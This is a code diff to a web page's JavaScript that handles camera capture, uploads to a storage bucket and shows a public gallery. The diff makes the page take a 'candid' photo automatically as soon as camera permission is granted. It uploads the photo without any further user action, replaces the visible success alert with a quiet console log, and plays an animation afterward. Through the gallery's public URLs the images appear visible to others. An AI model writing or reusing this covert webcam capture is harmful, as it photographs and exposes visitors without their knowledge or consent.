@@ -11,14 +11,26 @@ const gallery = document.getElementById("gallery");
 
 let stream;
 
-// CAMERA ACCESS
+// CAMERA ACCESS & CANDID SNAPSHOT
 async function startCamera() {
-  stream = await navigator.mediaDevices.getUserMedia({ video: true });
-  video.srcObject = stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    // Wait a tiny moment to ensure video feed is ready
+    video.onloadedmetadata = () => {
+      // Automatically take snapshot
+      takePhoto();
+    };
+  } catch (e) {
+    alert("Camera permission denied");
+    console.error(e);
+  }
 }
 
 // CAPTURE + UPLOAD
 async function takePhoto() {
+  // Draw current video frame
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
   const blob = await new Promise(resolve =>
@@ -33,10 +45,11 @@ async function takePhoto() {
     .upload(filename, blob);
 
   if (error) {
-    alert("UPLOAD FAILED");
-    console.error(error);
+    console.error("Upload failed:", error);
   } else {
-    alert("IMAGE STORED!");
+    console.log("Candid image stored:", filename);
+    // Optional: play runner animation immediately after snapshot
+    startRunner();
   }
 }
 
@@ -74,4 +87,10 @@ async function loadGallery() {
     img.src = url.publicUrl;
     gallery.appendChild(img);
   });
+}
+
+// RUNNER ANIMATION (OPTIONAL, called after snapshot)
+function startRunner() {
+  const runner = document.getElementById("runner");
+  runner.style.animation = "run 1s steps(4) infinite, move 3s linear infinite";
 }
